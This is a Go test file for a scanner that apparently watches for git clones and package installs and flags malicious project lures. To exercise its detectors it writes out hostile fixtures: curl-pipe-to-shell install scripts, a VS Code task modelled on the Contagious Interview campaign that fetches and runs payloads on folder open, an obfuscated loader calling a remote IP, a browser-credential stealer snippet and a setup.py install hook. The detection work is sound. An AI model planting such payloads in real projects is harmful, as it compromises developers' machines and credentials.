package projscan

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"
)

// ── triggers ─────────────────────────────────────────────────────────────────

func TestFromExecRecognisesDownloadsAndInstalls(t *testing.T) {
	cases := []struct {
		image string
		args  []string
		cwd   string
		dir   string
		kind  string
	}{
		{"/usr/bin/git", []string{"git", "clone", "https://github.com/acme/coding-test.git"}, "/home/ana", "/home/ana/coding-test", "git_clone"},
		{"/usr/bin/git", []string{"clone", "--depth", "1", "-b", "main", "git@github.com:acme/x.git", "work/x"}, "/home/ana", "/home/ana/work/x", "git_clone"},
		{"/usr/bin/git", []string{"-c", "http.sslVerify=false", "clone", "https://h/a/b/", "/tmp/t"}, "/home/ana", "/tmp/t", "git_clone"},
		{"/usr/bin/git", []string{"clone", "--", "https://h/r.git"}, "/srv", "/srv/r", "git_clone"},
		{`C:\Program Files\Git\cmd\git.exe`, []string{"clone", "https://h/r.git", `D:\src\r`}, "", `D:\src\r`, "git_clone"},
		{"/usr/bin/gh", []string{"repo", "clone", "acme/test-task"}, "/home/ana", "/home/ana/test-task", "git_clone"},
		{"/usr/bin/npm", []string{"npm", "install"}, "/home/ana/p", "/home/ana/p", "npm_install"},
		{"/usr/bin/npm", []string{"ci"}, "/home/ana/p", "/home/ana/p", "npm_install"},
		{"/usr/local/bin/yarn", nil, "/home/ana/p", "/home/ana/p", "npm_install"},
		{"/usr/bin/pnpm", []string{"i"}, "/home/ana/p", "/home/ana/p", "npm_install"},
		{"/usr/bin/pip3", []string{"install", "-r", "requirements.txt"}, "/home/ana/p", "/home/ana/p", "pip_install"},
		{"/usr/bin/pip", []string{"install", "-e", "."}, "/home/ana/p", "/home/ana/p", "pip_install"},
	}
	for _, c := range cases {
		got, ok := FromExec(c.image, c.args, c.cwd)
		if !ok || got.Dir != c.dir || got.Kind != c.kind {
			t.Errorf("FromExec(%s %v, cwd %s) = %+v %v, want %s %s", c.image, c.args, c.cwd, got, ok, c.dir, c.kind)
		}
	}
}

func TestFromExecIgnoresEverythingElse(t *testing.T) {
	for _, c := range []struct {
		image string
		args  []string
	}{
		{"/usr/bin/git", []string{"status"}},
		{"/usr/bin/git", []string{"pull"}},
		{"/usr/bin/git", []string{"clone"}},               // no repository
		{"/usr/bin/npm", []string{"run", "build"}},        // not an install
		{"/usr/bin/pip", []string{"install", "requests"}}, // site-packages, no project
		{"/usr/bin/ls", []string{"-la"}},
	} {
		if got, ok := FromExec(c.image, c.args, "/home/ana"); ok {
			t.Errorf("FromExec(%s %v) = %+v, want nothing", c.image, c.args, got)
		}
	}
	// a relative clone target without a working directory can't be placed
	if _, ok := FromExec("/usr/bin/git", []string{"clone", "https://h/r.git"}, ""); ok {
		t.Error("relative clone without cwd must be skipped")
	}
}

func TestFromFileEventOnWindows(t *testing.T) {
	got, ok := FromFileEvent(`C:\Program Files\Git\mingw64\bin\git.exe`, "create", `C:\Users\ana\src\test-task\.git\HEAD`)
	if !ok || got.Dir != `C:\Users\ana\src\test-task` || got.Kind != "git_clone" {
		t.Fatalf("%+v %v", got, ok)
	}
	got, ok = FromFileEvent(`C:\Program Files\nodejs\node.exe`, "create", `C:\Users\ana\src\p\node_modules\.package-lock.json`)
	if !ok || got.Dir != `C:\Users\ana\src\p` || got.Kind != "npm_install" {
		t.Fatalf("%+v %v", got, ok)
	}
	for _, c := range [][3]string{
		{`C:\x\git.exe`, "write", `C:\r\.git\HEAD`},          // an existing repo's HEAD changing
		{`C:\x\notepad.exe`, "create", `C:\r\.git\HEAD`},     // not git
		{`C:\x\git.exe`, "create", `C:\r\.git\refs\heads\m`}, // not HEAD
	} {
		if got, ok := FromFileEvent(c[0], c[1], c[2]); ok {
			t.Errorf("FromFileEvent%v = %+v, want nothing", c, got)
		}
	}
}

// ── checks ───────────────────────────────────────────────────────────────────

func TestPackageJSONLifecycleScripts(t *testing.T) {
	for _, c := range []struct {
		json, sev string
	}{
		{`{"scripts":{"postinstall":"curl -s https://x.example/p.sh | sh"}}`, "high"},
		{`{"scripts":{"preinstall":"node -e \"eval(Buffer.from('aGk=','base64').toString())\""}}`, "high"},
		{`{"scripts":{"install":"powershell -w hidden -enc SQBFAFgA"}}`, "high"},
		{`{"scripts":{"prepare":"node .vscode/settings.js"}}`, "medium"},
		{`{"scripts":{"postinstall":"node ../../.cache/x.js"}}`, "medium"},
		{`{"scripts":{"postinstall":"node -e \"try{require('./postinstall')}catch(e){}\""}}`, "medium"},
		{`{"scripts":{"postinstall":"husky install","build":"curl https://x | sh"}}`, ""}, // build isn't run by install
		{`{"scripts":{"install":"node-gyp rebuild","prepare":"tsc -p ."}}`, ""},
		{`{"scripts":{"postinstall":"patch-package"}}`, ""},
		{`not json`, ""},
	} {
		got := CheckPackageJSON("package.json", []byte(c.json))
		if sev := topSeverity(got); sev != c.sev {
			t.Errorf("%s: severity %q, want %q (%+v)", c.json, sev, c.sev, got)
		}
	}
}

// The Contagious Interview lure: a task VS Code runs on folder open, per-OS
// download-and-run, output hidden. JSON with comments and trailing commas.
const lureTasks = `{
  // See https://go.microsoft.com/fwlink/?LinkId=733558
  "version": "2.0.0",
  "tasks": [
    {
      "label": "eslint-check",
      "type": "shell",
      "osx": { "command": "curl 'https://api-node.vercel.app/settings/mac?flag=5' | sh" },
      "linux": { "command": "wget -qO- 'https://api-node.vercel.app/settings/linux?flag=5' | sh" },
      "windows": { "command": "curl https://api-node.vercel.app/settings/windows?flag=5 | cmd" },
      "problemMatcher": [],
      "presentation": { "reveal": "never", "echo": false, "close": true, },
      "runOptions": { "runOn": "folderOpen" },
    },
  ],
}`

func TestVSCodeAutorunTasks(t *testing.T) {
	got := CheckVSCodeTasks(".vscode/tasks.json", []byte(lureTasks))
	if len(got) != 1 || got[0].Severity != "high" || !strings.Contains(got[0].Detail, "eslint-check") {
		t.Fatalf("%+v", got)
	}
	plain := `{"tasks":[{"label":"watch","command":"npm run watch","runOptions":{"runOn":"folderOpen"}}]}`
	if got := CheckVSCodeTasks(".vscode/tasks.json", []byte(plain)); topSeverity(got) != "medium" {
		t.Fatalf("auto-run without anything else: %+v", got)
	}
	manual := `{"tasks":[{"label":"build","command":"curl https://x | sh"}]}` // runs only when asked
	if got := CheckVSCodeTasks(".vscode/tasks.json", []byte(manual)); len(got) != 0 {
		t.Fatalf("manual task flagged: %+v", got)
	}
}

func TestJSLoaders(t *testing.T) {
	obf := strings.Repeat("var _0x3f2a1b=['x'];", 25)
	beaverTail := obf + `const _0x5c=require('child_process');const a=require('axios');a.get('http://95.164.17.24:1224/pdown')`
	if got := CheckJS("lib/utils.js", []byte(beaverTail)); topSeverity(got) != "high" {
		t.Fatalf("obfuscated loader: %+v", got)
	}
	stealer := `const os=require('os');const {exec}=require('child_process');const https=require('https');
		const p=os.homedir()+'/.config/google-chrome/Default/Login Data';exec('cp '+p+' /tmp/x');https.request({host:'x'})`
	if got := CheckJS("index.js", []byte(stealer)); topSeverity(got) != "high" {
		t.Fatalf("plain stealer: %+v", got)
	}
	if got := CheckJS("x.js", []byte(`eval(atob("Y29uc29sZS5sb2coMSk="))`)); topSeverity(got) != "medium" {
		t.Fatalf("decode-and-eval alone: %+v", got)
	}
	for name, benign := range map[string]string{
		"minified bundle": strings.Repeat("function a(b){return b+1}", 3000),
		"express server":  `const {exec}=require('child_process');const http=require('http');http.createServer().listen(3000)`,
		"cli tool":        `const fs=require('fs');console.log(require('os').homedir())`,
	} {
		if got := CheckJS("x.js", []byte(benign)); len(got) != 0 {
			t.Errorf("%s flagged: %+v", name, got)
		}
	}
}

func TestPythonSetup(t *testing.T) {
	if got := CheckPythonSetup("setup.py", []byte("import base64\nexec(base64.b64decode('cHJpbnQoMSk='))")); topSeverity(got) != "high" {
		t.Fatalf("%+v", got)
	}
	evil := "from setuptools.command.install import install\nimport urllib.request\nclass I(install):\n  def run(self): urllib.request.urlopen('http://x')\nsetup(cmdclass={'install': I})"
	if got := CheckPythonSetup("setup.py", []byte(evil)); topSeverity(got) != "high" {
		t.Fatalf("%+v", got)
	}
	if got := CheckPythonSetup("setup.py", []byte("from setuptools import setup\nsetup(name='x')")); len(got) != 0 {
		t.Fatalf("%+v", got)
	}
}

// ── scanning ─────────────────────────────────────────────────────────────────

func writeTree(t *testing.T, files map[string]string) string {
	t.Helper()
	dir := t.TempDir()
	for name, content := range files {
		p := filepath.Join(dir, filepath.FromSlash(name))
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	return dir
}

func TestScanDirFindsTheLureAndScansEveryFile(t *testing.T) {
	dir := writeTree(t, map[string]string{
		"package.json":                   `{"name":"test-task","scripts":{"start":"node index.js"}}`,
		".vscode/tasks.json":             lureTasks,
		"index.js":                       `console.log("hello")`,
		"node_modules/evil/package.json": `{"scripts":{"postinstall":"curl https://x | sh"}}`, // skipped
		".git/hooks/post-checkout":       "#!/bin/sh\ncurl https://x | sh",                    // skipped
		"README.md":                      "# Test task",
	})
	var mu sync.Mutex
	var scanned []string
	res := ScanDir(context.Background(), dir, Options{ScanFile: func(_ context.Context, p string) {
		mu.Lock()
		scanned = append(scanned, filepath.ToSlash(strings.TrimPrefix(p, dir+string(filepath.Separator))))
		mu.Unlock()
	}})
	if len(res.Findings) != 1 || res.Findings[0].Check != "vscode_autorun" || res.Findings[0].File != ".vscode/tasks.json" {
		t.Fatalf("findings %+v", res.Findings)
	}
	if res.Files != 4 || len(scanned) != 4 {
		t.Fatalf("files=%d scanned=%v (node_modules and .git must be skipped)", res.Files, scanned)
	}
}

func TestScanDirStopsAtMaxFiles(t *testing.T) {
	files := map[string]string{}
	for i := 0; i < 30; i++ {
		files["f"+strings.Repeat("x", i)+".txt"] = "x"
	}
	scanned := 0
	res := ScanDir(context.Background(), writeTree(t, files), Options{MaxFiles: 10,
		ScanFile: func(context.Context, string) { scanned++ }})
	if scanned != 10 || res.Files != 30 || !res.Truncated {
		t.Fatalf("scanned=%d %+v", scanned, res)
	}
}

// Filler files ahead of the lure in walk order must not push it out of reach:
// the checks look at every file they know, the cap is only for ScanFile.
func TestFillerFilesCannotHideTheLure(t *testing.T) {
	files := map[string]string{".vscode/tasks.json": lureTasks}
	for i := 0; i < 40; i++ {
		files[".0/filler"+strings.Repeat("x", i)] = "x"
	}
	res := ScanDir(context.Background(), writeTree(t, files), Options{MaxFiles: 10,
		ScanFile: func(context.Context, string) {}})
	if topSeverity(res.Findings) != "high" {
		t.Fatalf("%+v", res)
	}
}

func TestLinesCarryTheVerdictAndEachFinding(t *testing.T) {
	trig := Trigger{Dir: `/home/ana/test task`, Kind: "git_clone", Origin: "https://github.com/acme/t.git", Image: "/usr/bin/git"}
	lines := Lines(trig, Result{Files: 3, Findings: []Finding{
		{"high", "vscode_autorun", ".vscode/tasks.json", `task "x" runs curl`},
		{"medium", "js_loader", "a.js", "obfuscated code"},
	}})
	if len(lines) != 3 {
		t.Fatalf("%v", lines)
	}
	for _, want := range []string{"event=project_scan ", "verdict=suspicious", "severity=high", `dir="/home/ana/test task"`,
		`top=".vscode/tasks.json: task \"x\" runs curl"`, "findings=2"} {
		if !strings.Contains(lines[0], want) {
			t.Errorf("summary %q lacks %q", lines[0], want)
		}
	}
	if !strings.HasPrefix(lines[1], "event=project_scan_finding severity=high check=vscode_autorun") {
		t.Errorf("finding line %q", lines[1])
	}
	clean := Lines(trig, Result{Files: 3})
	if len(clean) != 1 || !strings.Contains(clean[0], "verdict=clean severity=none") {
		t.Fatalf("%v", clean)
	}
}

func TestScannerWaitsForTheCloneThenScansOnce(t *testing.T) {
	dir := filepath.Join(t.TempDir(), "test-task")
	var mu sync.Mutex
	var lines []string
	s := New(Options{Settle: 50 * time.Millisecond, MaxWait: 5 * time.Second,
		Emit: func(l string) { mu.Lock(); lines = append(lines, l); mu.Unlock() }})
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go s.Run(ctx)
	trig := Trigger{Dir: dir, Kind: "git_clone", Origin: "https://h/test-task.git", Image: "git"}
	s.Offer(trig)
	s.Offer(trig) // again at once: ignored
	// git creates the directory and files after it started
	time.Sleep(80 * time.Millisecond)
	_ = os.MkdirAll(filepath.Join(dir, ".vscode"), 0o755)
	_ = os.WriteFile(filepath.Join(dir, ".vscode", "tasks.json"), []byte(lureTasks), 0o644)
	deadline := time.Now().Add(3 * time.Second)
	for time.Now().Before(deadline) {
		mu.Lock()
		n := len(lines)
		mu.Unlock()
		if n > 0 {
			break
		}
		time.Sleep(20 * time.Millisecond)
	}
	time.Sleep(200 * time.Millisecond)
	mu.Lock()
	defer mu.Unlock()
	if len(lines) != 2 || !strings.Contains(lines[0], "verdict=suspicious") {
		t.Fatalf("lines %v", lines)
	}
}

func TestOfferHoldsTheSameDirectory(t *testing.T) {
	s := New(Options{RescanHold: time.Minute})
	var mu sync.Mutex
	now := time.Unix(1000, 0)
	s.now = func() time.Time { mu.Lock(); defer mu.Unlock(); return now }
	s.Offer(Trigger{Dir: "/p", Kind: "npm_install"})
	s.Offer(Trigger{Dir: "/p", Kind: "npm_install"}) // within the hold: ignored
	s.Offer(Trigger{Dir: "/P", Kind: "npm_install"}) // another directory on Linux
	s.Offer(Trigger{Dir: `C:\Src\P`, Kind: "npm_install"})
	s.Offer(Trigger{Dir: `c:\src\p`, Kind: "npm_install"}) // the same one on Windows
	mu.Lock()
	now = now.Add(2 * time.Minute)
	mu.Unlock()
	s.Offer(Trigger{Dir: "/p", Kind: "npm_install"}) // hold over
	if s.Pending() != 4 {
		t.Fatalf("queued %d, want 4", s.Pending())
	}
}

// A clone whose directory never appears (a failed clone, a container's cwd)
// is given up after MissingTimeout, and its directory isn't held.
func TestAMissingCloneIsGivenUpAndReleased(t *testing.T) {
	s := New(Options{Settle: 10 * time.Millisecond, MissingTimeout: 50 * time.Millisecond, Emit: func(string) {}})
	dir := filepath.Join(t.TempDir(), "never")
	s.Offer(Trigger{Dir: dir, Kind: "git_clone"})
	deadline := time.Now().Add(2 * time.Second)
	for time.Now().Before(deadline) {
		if s.claim(dir) { // released: claimable again
			return
		}
		time.Sleep(10 * time.Millisecond)
	}
	t.Fatal("missing clone still held")
}

func topSeverity(f []Finding) string {
	best := ""
	for _, x := range f {
		if rank(x.Severity) > rank(best) {
			best = x.Severity
		}
	}
	return best
}
